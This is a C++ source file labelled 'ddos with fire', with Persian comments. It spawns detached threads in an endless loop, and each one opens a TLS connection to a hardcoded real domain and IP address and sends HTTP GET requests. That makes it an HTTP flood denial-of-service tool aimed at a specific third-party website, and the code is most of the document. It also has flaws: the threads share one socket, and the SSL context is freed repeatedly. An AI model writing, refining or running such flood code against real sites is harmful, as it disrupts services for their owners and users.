// ddos with fire

#include <iostream>
#include <string>
#include <math.h>
#include <memory>
#include <any>
#include <future>
#include <thread>
#include <utility>
#include <vector>
#include <map>
#include <set>
#include <type_traits>
#include <functional>
#include <chrono>
#include <exception>
#include <array>
#include <cstring>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

// async
#include <atomic>
#include <queue>
#include <mutex>
#include <condition_variable>

class FireAndForget
{
public:
    /**
     * execute task on fire and push to waiter tasks (with waiter)
     */
    template <typename Func>
    FireAndForget &operator>>(Func &&func)
    {
        futures_.push_back(run(std::forward<Func>(func)));
        return *this;
    }

    /**
     * execute task on fire (no waiter tasks), fast and simple
     */
    template <typename Func>
    FireAndForget &operator<<(Func &&func)
    {
        std::jthread([func = std::forward<Func>(func)]()
                     {
            try {
                if (std::uncaught_exceptions() > 0) {
                    throw std::runtime_error("Memory is being deallocated, stopping task.");
                }
                func();
            } catch (const std::exception& e) {
                std::cerr << "Exception in immediate task: " << e.what() << '\n';
            } catch (...) {
                std::cerr << "Unknown exception in immediate task.\n";
            } })
            .detach();

        return *this;
    }

    // اجرا کردن یک تسک و بازگشت future برای صبر کردن
    template <typename Func>
    std::future<void> run(Func &&func)
    {
        std::promise<void> promise;
        auto future = promise.get_future();

        std::jthread([func = std::forward<Func>(func), promise = std::move(promise)]() mutable
                     {
            try {
                func();
                promise.set_value(); 
            } catch (const std::exception& e) {
                std::cerr << "Exception in thread: " << e.what() << '\n';
                promise.set_exception(std::current_exception());
            } catch (...) {
                std::cerr << "Unknown exception in thread.\n";
                promise.set_exception(std::current_exception());
            } })
            .detach();

        return future;
    }

    // wait for one task
    void waitForTask(std::future<void> &future)
    {
        future.wait();
    }

    // wait for all tasks
    void waitForAllTasks()
    {
        for (auto &future : futures_)
        {
            future.wait();
        }
    }

private:
    std::vector<std::future<void>> futures_;
};

FireAndForget fire;

int main()
{
    const std::string host = "www.mahaksoft.com"; // نام دامنه سایت
    const int port = 443;                         // پورت HTTPS

    // ایجاد SSL
    SSL_library_init();
    SSL *ssl;
    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
    if (!ctx)
    {
        std::cerr << "Unable to create SSL context" << std::endl;
        return 1;
    }

    // ایجاد سوکت
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)
    {
        std::cerr << "Error creating socket" << std::endl;
        SSL_CTX_free(ctx);
        return 1;
    }

    // تنظیمات آدرس
    struct sockaddr_in server_address;
    server_address.sin_family = AF_INET;
    server_address.sin_port = htons(port);

    // تبدیل نام دامنه به آدرس IP
    if (inet_pton(AF_INET, "185.116.161.110", &server_address.sin_addr) <= 0)
    {
        std::cerr << "Invalid address/ Address not supported" << std::endl;
        close(sock);
        SSL_CTX_free(ctx);
        return 1;
    }

    while (true)
    {
        fire << [&]()
        {
            // اتصال به سرور
            if (connect(sock, (struct sockaddr *)&server_address, sizeof(server_address)) < 0)
            {
                std::cerr << "Connection failed" << std::endl;
                close(sock);
                SSL_CTX_free(ctx);
                return 1;
            }

            // ایجاد SSL
            ssl = SSL_new(ctx);
            SSL_set_fd(ssl, sock);

            // اتصال SSL
            if (SSL_connect(ssl) <= 0)
            {
                std::cerr << "SSL connection failed" << std::endl;
                close(sock);
                SSL_CTX_free(ctx);
                return 1;
            }

            // حلقه برای ارسال ۳ درخواست
            // for (int i = 1; i <= 3; ++i) {
            // ساخت درخواست HTTP GET
            std::string request = "GET / HTTP/1.1\r\n"
                                  "Host: " +
                                  host + "\r\n"
                                         "Connection: close\r\n\r\n";

            // ارسال درخواست به سرور
            ssize_t sent_bytes = SSL_write(ssl, request.c_str(), request.size());
            if (sent_bytes < 0)
            {
                std::cerr << "Error sending request " << std::endl;
                // break;  // در صورت بروز خطا، حلقه را متوقف کنید
                return 1;
            }

            // دریافت پاسخ
            std::array<char, 4096> buffer;
            std::string response;
            while (true)
            {
                ssize_t bytes_received = SSL_read(ssl, buffer.data(), buffer.size());
                if (bytes_received <= 0)
                {
                    break;
                }
                response.append(buffer.data(), bytes_received);
            }

            // نمایش پاسخ
            // std::cout << "Response for request " << i << ":\n";
            std::cout << "Res: " << response << "\n\n";
            // }

            // بستن SSL و سوکت
            SSL_shutdown(ssl);
            SSL_free(ssl);
            close(sock);
            SSL_CTX_free(ctx);

        return 0;
        };
    }
    return 0;
}
